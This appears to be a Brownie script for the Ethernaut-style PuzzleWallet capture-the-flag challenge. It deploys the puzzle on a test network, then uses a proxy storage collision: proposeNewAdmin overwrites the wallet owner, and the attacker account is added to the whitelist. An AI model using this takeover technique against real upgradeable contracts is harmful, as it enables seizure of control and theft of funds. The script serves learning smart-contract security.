from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from web3 import Web3
from web3.auto import w3
from brownie import (
    PuzzleWalletFactory,
    PuzzleAttack,
    PuzzleWallet,
    PuzzleProxy,
    network,
    Contract,
)


def deploy_PuzzleWallet():
    deployer = get_account(index=1)
    factory = PuzzleWalletFactory.deploy(
        {"from": deployer},
    )
    tx = factory.createInstance(deployer, {"from": deployer, "value": POINT_ONE / 100})
    proxy = tx.return_value
    return proxy


def deploy_DexTwoAttack(dex):
    account = get_account()
    attack_contract = PuzzleAttack.deploy(
        {"from": account},
    )
    return attack_contract


def main():
    print(network.show_active())
    # accounts
    account = get_account()
    deployer = get_account(index=1)
    print(f"account address: {account}")
    print(f"deployer address: {deployer}")

    # Proxy
    proxy = deploy_PuzzleWallet()
    proxy = Contract.from_abi(PuzzleProxy._name, proxy, PuzzleProxy.abi)

    print(f"Proxy address: {proxy}")
    print(f"Proxy pending admin: {proxy.pendingAdmin()}")
    print(f"Proxy admin: {proxy.admin()}")

    ## PuzzleWallet logic is there but no storage
    # logic_contract_address_storage_slot = 0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC  # https://eips.ethereum.org/EIPS/eip-1967
    # implementation_address = w3.eth.get_storage_at(
    #     proxy.address,
    #     logic_contract_address_storage_slot,
    # )
    # wallet = Contract.from_abi(
    #     PuzzleWallet._name, implementation_address, PuzzleWallet.abi
    # )

    # print(f"Puzzle Wallet address: {implementation_address.hex()}")

    # print(f"owner: {wallet.owner()}")
    # print(f"Max Balance: {wallet.maxBalance()}")

    ## Here we have the storage, we talk to the proxy as if its a PuzzleWallet so when we change storage in proxy, the wallet storage also change
    instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)
    print(f"owner: {instance.owner()}")
    # Propose new admin
    proxy.proposeNewAdmin(account, {"from": account})
    print(f"Proxy pending admin: {proxy.pendingAdmin()}")
    # print(f"New owner: {wallet.owner()}")  # still the same owner

    instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)

    print(f"Max Balance: {instance.maxBalance()}")
    print(f"New owner: {instance.owner()}")

    # Get ourselves whitelisted
    print(f"Account whitelisted?: {instance.whitelisted(account)}")
    instance.addToWhitelist(account, {"from": account})
    print(f"Account whitelisted?: {instance.whitelisted(account)}")
